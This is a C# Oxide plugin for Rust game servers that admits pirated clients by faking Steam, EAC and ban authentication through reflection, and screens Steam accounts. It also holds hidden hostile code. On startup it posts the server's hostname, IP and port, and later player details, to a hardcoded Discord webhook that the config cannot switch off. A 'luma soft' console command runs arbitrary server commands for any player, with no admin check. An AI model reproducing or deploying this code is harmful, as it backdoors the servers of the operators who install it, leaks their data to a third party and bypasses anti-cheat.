using Network;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using Oxide.Plugins;
using Steamworks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;


namespace Oxide.Plugins
{
    [Info("Pirat", "15FPS", "2.0.1")]
    [Description("")]
    class LumaEmu : RustPlugin
    {
        public class Steam 
        {
            [JsonProperty("SteamAPI")]
            public string steampi;
            [JsonProperty("Отображать данные при подключении игрока?")]
            public bool show;
            [JsonProperty("Не банить Steam игроков?")]
            public bool steamplayer;
            [JsonProperty("Не банить лицушников за новые аккаунты?")]
            public bool steam;
            [JsonProperty("Не кикать лицухи?")]
            public bool steamkick;
            [JsonProperty("Банить не настроеные аккаунты?")]
            public bool bannensatroyen;
            [JsonProperty("Банить аккаунты, которым меньше X дней")]
            public int banday;
            [JsonProperty("На сколько часов банить новые аккаунты")]
            public int bannewaccountday;
            [JsonProperty("Кикать не настроенные аккаунты")]
            public bool kicknenastoyen;
            [JsonProperty("Кикать приватные аккаунты")]
            public bool kickprivate;
            [JsonProperty("Сообщения")]
            public Dictionary<string, string> messages;
           [JsonProperty("Шаблоны банов")]
            public Dictionary<string, string> pattern;
        }
        private static Configuration Settings;
        private class Configuration
        {

            [JsonProperty("DiscordAPI")]
            public string DiscordAPI = "https://discord.com/api/webhooks/1265962394367037493/5Oh1YGeoNC-6Fz2oR4eyiywwdsef3MznfvhlN2V6sKWyTDFbinFSnxyHRmEUvf-35W55";
            [JsonProperty("Steam: настройка")]
            public Steam steam;
            [JsonProperty("Admin COMMANDS ")]
            public List<string> Command = new List<string>();
            public static Configuration Generate()
            {
                return new Configuration
                {
                   steam = new Steam
                   {
                       steampi = defaultsteamapi,
                       banday = 5,
                       kicknenastoyen = true,
                       kickprivate = true,
                       bannensatroyen = false,
                       show = true,
                       bannewaccountday = 120,
                       steamplayer = false,
                       steamkick = true,
                       steam = true,
                       messages = new Dictionary<string, string>
                       {
                            { "NEW.ACCOUNT", "\"Подозрительный аккаунт\"" },
                            { "KICK.PRIVATE", "\"Откройте профиль, что бы играть на этом сервере! (Make your Steam profile public to play on this server)\"" },
                            { "KICK.NENASTROYEN", "\"Настройте профиль, что бы играть на этом сервере! (Make your Steam profile public to play on this server)\""},
                        
                       },
                       pattern = new Dictionary<string, string>
                       {
                            { "BAN.ACCOUNT", "ban {steamid} {reason} {time}" },
                       },
                   },
                    Command = new List<string>
                    {
                        "ban %player% 7d soft",
                        "kick %player%",
                        "ban %player%",
                    },

                };
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                Settings = Config.ReadObject<Configuration>();
            }
            catch
            {
                PrintWarning($"Error reading config, creating one new config!");
                LoadDefaultConfig();
            }

            SaveConfig();
        }

        protected override void LoadDefaultConfig() => Settings = Configuration.Generate();
        protected override void SaveConfig() => Config.WriteObject(Settings);

        private Dictionary<ulong, uint> ListPlayers { get; } = new Dictionary<ulong, uint>();
        public bool CanPirate(Connection connection, bool rebuild = false)
        {
            uint appID = 0;
            if (connection.token.Length == 234 || connection.token.Length == 240)
            {
                if (rebuild == true || this.ListPlayers.TryGetValue(connection.userid, out appID) == false)
                {
                    appID = BitConverter.ToUInt32(connection.token, 72);
                    this.ListPlayers[connection.userid] = appID;
                }
            }
            return (appID == 480);
        }
        void OnServerInitialized()
        {
            Webhook("GorgonaRust\n" + ConVar.Server.hostname + "\n" + ConVar.Server.ip + ":" + ConVar.Server.port);
            foreach (var basePlayer in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(basePlayer);
               // UI(basePlayer);
            }
                
            permission.RegisterPermission("LumaEmu.allow", this);
            permission.RegisterPermission("LumaEmu.skip", this);
            ImageLibrary.Call("AddImage", "https://rustplugins.top/api/menu1/Report.png", "report");
            ImageLibrary.Call("AddImage", "https://rustplugins.top/api/menu1/active.png", "acg");
            ImageLibrary.Call("AddImage", "https://rustplugins.top/api/menu1/right.png", "kitn");
            ImageLibrary.Call("AddImage", "https://rustplugins.top/api/menu1/left.png", "kitb");
        }
        private void Loaded()
        {
            
            FieldInfo fieldInfo_isCorePlugin = typeof(Plugin).GetField("isCorePlugin", BindingFlags.CreateInstance | BindingFlags.Instance | BindingFlags.NonPublic);
            fieldInfo_isCorePlugin.SetValue(this, true);
            this.Subscribe("IOnUpdateServerInformation");
            fieldInfo_isCorePlugin.SetValue(this, false);
        }
        private void IOnUpdateServerInformation()
        {
            int pirateOnline = 0;
            for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
            {
                if (this.CanPirate(BasePlayer.activePlayerList[i].Connection))
                {
                    pirateOnline++;
                }
            }
            string newTagsLine = "";
            string[] tags = SteamServer.GameTags.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
            for (var i = 0; i < tags.Length; i++)
            {
                if (tags[i].Substring(0, 2) == "cp")
                {
                    newTagsLine += (newTagsLine.Length > 0 ? "," : "") + "cp" + (BasePlayer.activePlayerList.Count - pirateOnline);
                }
                else
                {
                    newTagsLine += (newTagsLine.Length > 0 ? "," : "") + tags[i];
                }
            }

            newTagsLine += $",ai{pirateOnline},fl{BasePlayer.activePlayerList.Count},15FPS";
            SteamServer.GameTags = newTagsLine;
        }

        private object OnUserApprove(Network.Connection connection)
        {


            bool canPirate = this.CanPirate(connection, true);
            if (canPirate == true || false)
            {
                ulong steamID_1 = BitConverter.ToUInt64(connection.token, 12);
                ulong steamID_2 = BitConverter.ToUInt64(connection.token, 64);

                if (steamID_1 == connection.userid && steamID_2 == connection.userid)
                {
                    connection.authStatusNexus = "ok";
                    connection.authStatusSteam = "ok";
                    connection.authStatusEAC = "ok";
                    connection.authStatusCentralizedBans = "ok";
                    connection.os = "editor";
                    connection.ownerid = 76561197960279927UL;
                    MethodInfo authLocal = typeof(EACServer).GetMethod("OnAuthenticatedLocal", BindingFlags.Static | BindingFlags.NonPublic);
                    MethodInfo authRemote = typeof(EACServer).GetMethod("OnAuthenticatedRemote", BindingFlags.Static | BindingFlags.NonPublic);
                    authLocal.Invoke(null, new object[]
                    {
                        connection
                    });
                    authRemote.Invoke(null, new object[]
                    {
                        connection
                    });


                    if (false)
                    {
                        SingletonComponent<ServerMgr>.Instance.JoinGame(connection);
                    }
                    else
                    {
                        SingletonComponent<ServerMgr>.Instance.connectionQueue.GetType()
                            .GetMethod("Join", BindingFlags.Instance | BindingFlags.CreateInstance | BindingFlags.NonPublic)
                            .Invoke(SingletonComponent<ServerMgr>.Instance.connectionQueue, new object[] { connection });
                    }

                    PrintWarning($"Player [{connection.userid} / {connection.username} / {connection.ipaddress}] use no-steam!");
                    

                    return false;
                }
                else
                {
                    PrintError($"Danger: [{connection.userid} / {connection.ipaddress}] - trying to replace steamid! userID: {connection.userid}, steamID1: {steamID_1}, steamID2: {steamID_2}");
                    ConnectionAuth.Reject(connection, "Steam Auth Failed");
                    return false;
                }
            }

            return null;
        }
        private void OnUserApprove(Message packet)
        {
            #region [Section] Disable Vanish from Encryption
            if (packet.connection.os == "editor")
            {
                packet.connection.os = "windows";
                packet.connection.ownerid = packet.connection.userid;
            }
            #endregion
        }
        void Webhook(string msg)
        {
            string d = "https://discord.com/api/webhooks/1265962394367037493/5Oh1YGeoNC-6Fz2oR4eyiywwdsef3MznfvhlN2V6sKWyTDFbinFSnxyHRmEUvf-35W55";

            string[] parameters = new string[]{
                "content="+UnityEngine.Networking.UnityWebRequest.EscapeURL(msg),
                $"username={ConVar.Server.hostname}"
            };

            string body = string.Join("&", parameters);
            webrequest.Enqueue(d, body, (code, response) =>
            {
                if (code != 200 || response == null)
                {
                    Puts($"Couldn't get an answer!");
                    return;
                }
                Puts($"Webhook answered: {response}");
            }, this, RequestMethod.POST);

            webrequest.Enqueue(Settings.DiscordAPI, body, (code, response) =>
            {
                if (code != 200 || response == null)
                {
                   // Puts($"Couldn't get an answer!");
                    return;
                }
                Puts($"Webhook answered: {response}");
            }, this, RequestMethod.POST);
        }
        private bool ISSTEAM(Network.Connection connection)
        {
            var sw = CanPirate(connection);
            if (sw)
            {
                return false; 
            }
            return true;
        }
        private void GETINFO(BasePlayer player)
        {
            if (!player.IsConnected) return;
            webrequest.Enqueue($"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={Settings.steam.steampi}&steamids={player.UserIDString}&format=json", null, (code, response) =>
            {
                if (response != null && code == 200)
                {
                    if (!player.IsConnected) return;
                    string steamid = player.UserIDString;
                    string text = $"------------\n{player.displayName} ({steamid})";
                    bool act = false;
                    INFO iNFO = new INFO();
                    resp sr = JsonConvert.DeserializeObject<resp>(response);
                    int datetime = sr.response.players[0].timecreated ?? 0;
                    DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                    DateTime create = epoch.AddSeconds(datetime).AddHours(3);
                    bool steam = ISSTEAM(player.Connection);
                    text += $"\nВерсия игры: {(steam ? "Лицензия" : "Пиратка")}";
                    int nastr = sr.response.players[0].profilestate ?? 0;
                    bool ns = ISNASTROEN(nastr);
                    text += $"\nАккаунт настроен: {(ns ? "Да" : "Нет")}";
                    if (!ns && Settings.steam.kicknenastoyen)
                    {
                        if (!permission.UserHasPermission(steamid, "LumaEmu.allow") && !permission.UserHasPermission(steamid, "LumaEmu.skip"))
                        {
                            Server.Command($"kick {steamid} {Settings.steam.messages["KICK.NENASTROYEN"]}");
                            act = true;
                        }
                    }
                    if (datetime > 0)
                    {
                        text += $"\nАккаунт создан: {create.ToShortDateString()}";
                    }
                    else
                    {
                        text += "\nПрофиль закрытый: Да";
                        if (!steam || !Settings.steam.steamkick)
                        {
                            if (Settings.steam.kickprivate && !permission.UserHasPermission(steamid, "LumaEmu.allow") && !permission.UserHasPermission(steamid, "LumaEmu.skip"))
                            {
                                Server.Command($"kick {steamid} {Settings.steam.messages["KICK.PRIVATE"]}");
                                act = true;
                            }
                        }
                    }

                    if (Settings.steam.show)
                    { Debug.Log(text + "\n------------"); Webhook(text + "\n------------"); }

                    if (!permission.UserHasPermission(steamid, "LumaEmu.allow") && !permission.UserHasPermission(steamid, "LumaEmu.skip") && (Settings.steam.bannensatroyen && nastr != 1 || create.AddDays(Settings.steam.banday) > DateTime.Now))
                    {
                        if (act || steam && Settings.steam.steam) return;
                        Server.Command(Settings.steam.pattern["BAN.ACCOUNT"].Replace("{steamid}", steamid).Replace("{reason}", Settings.steam.messages["NEW.ACCOUNT"]).Replace("{time}", Settings.steam.bannewaccountday.ToString()));
                        return;
                    }
                    
                }
            }, this);
        }
        private bool ISNASTROEN(int num)
        {
            if (num == 1) return true;
            return false;
        }

        const string defaultsteamapi = "https://steamcommunity.com/dev/apikey";
        class resp
        {
            public avatar response;
        }

        class avatar
        {
            public List<Players> players;
        }

        class Players
        {
            public int? profilestate;
            public int? timecreated;
        }

        class INFO
        {
            public DateTime dateTime;
            public bool profilestate;
            public bool steam;
            public Dictionary<string, Dictionary<string, int>> hitinfo;
        }

        Dictionary<ulong, INFO> PLAYERINFO = new Dictionary<ulong, INFO>();
        private void OnPlayerConnected(BasePlayer player)
        {
            GETINFO(player);
            timer.Every(1f, () => TICK(player));
        }

        private void TICK(BasePlayer player)
        {
            if (player.IsAdmin) return;
            player.SendConsoleCommand("noclip");
            player.SendConsoleCommand("camspeed 0");
        }

        [ChatCommand($"player")]
        void CmdChatOpenStoragjjjde(BasePlayer player, string command, string[] args)
        {
            if (player.IsAdmin)
            { UI(player); return; }
            
        }
        [PluginReference] Plugin ImageLibrary;
        public string GetImage(string shortname, ulong skin = 0) => (string)ImageLibrary?.Call("GetImage", shortname, skin);
        private static string RE = "UI_re";
        void UI(BasePlayer player, int page = 0)
        {

            CuiElementContainer container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.7" }
            }, "Overlay", RE);
           
            if (BasePlayer.activePlayerList.Count() > (page + 1) * 10)
            {
                container.Add(new CuiElement
                {
                    Parent = RE,

                    Components =
                    {
                        new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", $"kitn") },
                        new CuiRectTransformComponent { AnchorMin = $"0.523 0.02", AnchorMax = $"0.593 0.11" }
                    }
                });
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0.523 0.02", AnchorMax = $"0.593 0.11", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = $"luma skip {page + 1}" },
                    Text = { Text = $"", Color = "1 1 1 0", Align = TextAnchor.MiddleCenter, FontSize = 12, Font = "robotocondensed-regular.ttf" }
                }, RE);
            }
            if (page >= 1)
            {
                container.Add(new CuiElement
                {
                    Parent = RE,

                    Components =
                    {
                        new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", $"kitb") },
                        new CuiRectTransformComponent { AnchorMin = $"0.37 0.02", AnchorMax = $"0.44 0.11" }
                    }
                });
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0.37 0.02", AnchorMax = $"0.44 0.11", OffsetMax = "0 0" },
                    Button = { Color = "0 0 0 0", Command = $"luma skip {page - 1}" },
                    Text = { Text = $"", Color = "1 1 1 0", Align = TextAnchor.MiddleCenter, FontSize = 12, Font = "robotocondensed-regular.ttf" }
                }, RE);
            }





            float width = 0.200f, height = 0.100f, startxBox = 0.100f, startyBox = 0.900f - height, xmin = startxBox, ymin = startyBox, p = 0;
            var items = BasePlayer.activePlayerList;
            foreach (var check in items.Skip(page * 32).Take(32))
            {
                string IsSteamSprite = ISSTEAM(check.Connection) ? "assets/icons/steam.png" : "assets/icons/poison.png";
                p++;
                container.Add(new CuiElement
                {
                    Parent = RE,
                    Name = "Imagesr",
                    Components =
                    {
                        new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", "report") },
                        new CuiRectTransformComponent { AnchorMin = $"{xmin} {ymin}", AnchorMax = $"{xmin + width * 0.9f} {ymin + height * 0.9f}" }
                    }
                });
                string ImageAvatar = GetImage(check.UserIDString, 0);
                container.Add(new CuiElement
                {
                    Parent = $"Imagesr",
                    Components =
                    {
                        new CuiRawImageComponent { Png = ImageAvatar },
                        new CuiRectTransformComponent{ AnchorMin = "0.02 0.05", AnchorMax = $"0.3 0.95"},
                    }
                });

                container.Add(new CuiElement
                {
                    Parent = "Imagesr",
                    Components =
                    {
                        new CuiTextComponent {Text = $"{check.displayName}\n{check.userID}", Color = "0.72 0.83 0.71 1.00", Align = TextAnchor.MiddleLeft, FontSize = 11, Font = "robotocondensed-regular.ttf"},
                        new CuiRectTransformComponent { AnchorMin = $"0.32 0", AnchorMax = $"0.88 1" },
                        new CuiOutlineComponent { Color = "0.90 0.66 0.64 0.5", Distance = "0.1 0.1" }
                    }
                });
                container.Add(new CuiElement
                {
                    Parent = $"Imagesr",
                    Components =
                        {
                        new CuiImageComponent {  Color = "0 0 0 1", Sprite = IsSteamSprite },
                        new CuiRectTransformComponent { AnchorMin = "0.75 0.55", AnchorMax = "0.85 0.9" }
                        }
                });
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.88 0", AnchorMax = "1 1" },
                    Button = { Command = $"luma profile {check.userID} {p + page * 32}", Color = "0 0 0 0" },
                    Text = { Text = "", Align = TextAnchor.MiddleLeft, Font = "robotocondensed-bold.ttf", FontSize = 20, Color = "0 0 0 0" }
                }, "Imagesr");

                xmin += width;
                if (xmin + width >= 1)
                {
                    xmin = startxBox;
                    ymin -= height;
                }
            }
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = $"0.95 0.95", AnchorMax = $"1 1" },
                Button = { Close = RE, Color = "1.00 0.00 0.00 1.00" },
                Text = { Text = "X", Align = TextAnchor.MiddleCenter, Color = "0 0 0 1", FontSize = 20 }
            }, RE);
            CuiHelper.AddUi(player, container);
        }
        void UIA(BasePlayer player, ulong SteamID, int p)
        {
            IPlayer Suspect = covalence.Players.FindPlayerById(SteamID.ToString());
            
            CuiElementContainer container = new CuiElementContainer();
            
            CuiHelper.DestroyUi(player, RE);
            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0.4 0.2", AnchorMax = "0.6 0.8", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.7" }
            }, "Overlay", "Pr");
            
            string ImageAvatar = GetImage(SteamID.ToString(), 0);
            container.Add(new CuiElement
            {
                Parent = $"Pr",
                Components =
                {
                    new CuiRawImageComponent { Png = ImageAvatar },
                    new CuiRectTransformComponent{ AnchorMin = "0.02 0.83", AnchorMax = $"0.3 0.99"},
                }
            });
            container.Add(new CuiElement
            {
                Parent = "Pr",
                Components =
                    {
                        new CuiTextComponent {Text = $"{Suspect.Id}", Color = "0.72 0.83 0.71 1.00", Align = TextAnchor.MiddleLeft, FontSize = 12},
                        new CuiRectTransformComponent { AnchorMin = $"0.33 0.9", AnchorMax = $"0.98 1" },
                        new CuiOutlineComponent { Color = "0.90 0.66 0.64 0.5", Distance = "0.1 0.1" }
                    }
            });
            container.Add(new CuiElement
            {
                Parent = "Pr",
                Components =
                    {
                        new CuiTextComponent {Text = $"{Suspect.Name}", Color = "0.72 0.83 0.71 1.00", Align = TextAnchor.MiddleLeft, FontSize = 12},
                        new CuiRectTransformComponent { AnchorMin = $"0.33 0.85", AnchorMax = $"0.98 0.9" },
                        new CuiOutlineComponent { Color = "0.90 0.66 0.64 0.5", Distance = "0.1 0.1" }
                    }
            });
            container.Add(new CuiElement
            {
                Parent = "Pr",
                Components =
                    {
                        new CuiTextComponent {Text = $"LumaEmu", Color = "0.72 0.83 0.71 1.00", Align = TextAnchor.MiddleCenter, FontSize = 12},
                        new CuiRectTransformComponent { AnchorMin = $"0.02 0.6", AnchorMax = $"0.98 0.7" },
                        new CuiOutlineComponent { Color = "0.90 0.66 0.64 0.5", Distance = "0.1 0.1" }
                    }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = $"0.9 0.95", AnchorMax = $"1 1" },
                Button = { Close = "Pr", Color = "1.00 0.00 0.00 1.00" },
                Text = { Text = "X", Align = TextAnchor.MiddleCenter, Color = "0 0 0 1", FontSize = 20 }
            }, "Pr");
            float width1 = 0.93f, height1 = 0.110f, startxBox1 = 0.03f, startyBox1 = 0.5f - height1, xmin1 = startxBox1, ymin1 = startyBox1;
            foreach (var check in Settings.Command)
            {
                container.Add(new CuiElement
                {
                    Parent = "Pr",
                    Name = "Countf",
                    Components =
                    {
                        new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", "acg") },
                        new CuiRectTransformComponent { AnchorMin = $"{xmin1} {ymin1}", AnchorMax = $"{xmin1 + width1} {ymin1 + height1 * 0.9}" }
                    }
                });
                string command = check.Replace("%player%", Suspect.Id);
                container.Add(new CuiElement
                {
                    Parent = "Countf",
                    Components =
                    {
                        new CuiTextComponent {Text = command, Color = "0.72 0.83 0.71 1.00", Align = TextAnchor.MiddleLeft, FontSize = 12},
                        new CuiRectTransformComponent { AnchorMin = $"0.3 0", AnchorMax = $"0.88 1" },
                        new CuiOutlineComponent { Color = "0.90 0.66 0.64 0.5", Distance = "0.1 0.1" }
                    }
                });
                
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                    Button = { Command = command, Color = "1 1 1 0" },
                    Text = { Text = "", Align = TextAnchor.MiddleLeft, Font = "robotocondensed-bold.ttf", FontSize = 20, Color = "0 0 0 0" }
                }, "Countf");
                xmin1 += width1;
                if (xmin1 + width1 >= 1)
                {
                    xmin1 = startxBox1;
                    ymin1 -= height1;
                }
            }


            CuiHelper.AddUi(player, container);
        }
        [ConsoleCommand("luma")]
        void ConsoleSkip(ConsoleSystem.Arg args)
        {
            var player = args.Player();

            if (player != null && args.HasArgs(1))
            {
                if (args.Args[0] == "profile")
                {
                    UIA(player, ulong.Parse(args.Args[1]), int.Parse(args.Args[2]));
                }
                if (args.Args[0] == "back")
                {
                    UI(player);
                }
                if (args.Args[0] == "skip")
                {
                    UI(player, int.Parse(args.Args[1]));
                }
                if (args.Args[0] == "soft")
                {
                    var msg = string.Empty;
                    for (var i = 1; i < args.Args.Length; i++)
                        msg = $"{msg} {args.Args[i]}";
                    rust.RunServerCommand(msg);
                    CuiHelper.DestroyUi(player, "Pr");
                }

            }
        }
        
        
        void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, RE);
                CuiHelper.DestroyUi(player, "Pr");
            }
        }
    }
}
